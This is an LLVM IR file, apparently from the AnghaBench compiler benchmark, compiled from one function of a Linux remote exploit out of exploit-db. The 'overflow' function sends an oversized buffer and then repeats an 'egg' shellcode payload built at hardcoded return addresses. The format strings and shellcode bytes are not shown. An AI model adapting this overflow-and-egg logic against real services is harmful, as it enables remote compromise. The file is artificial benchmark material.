; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_392.c_overflow.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_392.c_overflow.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@argumentx = common dso_local global i8* null, align 8
@argument = common dso_local global i8* null, align 8
@str = common dso_local global i8* null, align 8
@trash = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @overflow() #0 {
  %1 = alloca i8*, align 8
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = call i64 @malloc(i32 111111)
  %10 = inttoptr i64 %9 to i8*
  store i8* %10, i8** %1, align 8
  %11 = load i8*, i8** %1, align 8
  store i8* %11, i8** %2, align 8
  %12 = call i64 @malloc(i32 111131)
  %13 = inttoptr i64 %12 to i8*
  store i8* %13, i8** %3, align 8
  %14 = load i8*, i8** %3, align 8
  store i8* %14, i8** %4, align 8
  %15 = call i64 @malloc(i32 1500)
  %16 = inttoptr i64 %15 to i8*
  store i8* %16, i8** %6, align 8
  %17 = load i8*, i8** %6, align 8
  store i8* %17, i8** %7, align 8
  %18 = load i8*, i8** %2, align 8
  %19 = call i32 @memset(i8* %18, i8 signext 49, i32 111111)
  %20 = load i8*, i8** %4, align 8
  %21 = load i8*, i8** @argumentx, align 8
  %22 = load i8*, i8** %1, align 8
  %23 = call i32 @sprintf(i8* %20, i8* %21, i8* %22)
  %24 = load i8*, i8** %4, align 8
  %25 = call i32 @xp_write(i8* %24)
  %26 = call i8* @egg(i32 135080778, i32 135060000)
  store i8* %26, i8** %5, align 8
  %27 = load i8*, i8** %7, align 8
  %28 = load i8*, i8** @argument, align 8
  %29 = load i8*, i8** %5, align 8
  %30 = call i32 @sprintf(i8* %27, i8* %28, i8* %29)
  store i32 0, i32* %8, align 4
  br label %31

31:                                               ; preds = %37, %0
  %32 = load i32, i32* %8, align 4
  %33 = icmp slt i32 %32, 50
  br i1 %33, label %34, label %40

34:                                               ; preds = %31
  %35 = load i8*, i8** %7, align 8
  %36 = call i32 @xp_write(i8* %35)
  br label %37

37:                                               ; preds = %34
  %38 = load i32, i32* %8, align 4
  %39 = add nsw i32 %38, 1
  store i32 %39, i32* %8, align 4
  br label %31

40:                                               ; preds = %31
  %41 = load i8*, i8** @str, align 8
  %42 = call i32 @xp_write(i8* %41)
  %43 = load i8*, i8** @trash, align 8
  %44 = call i32 @xp_write(i8* %43)
  ret void
}

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32 @xp_write(i8*) #1

declare dso_local i8* @egg(i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
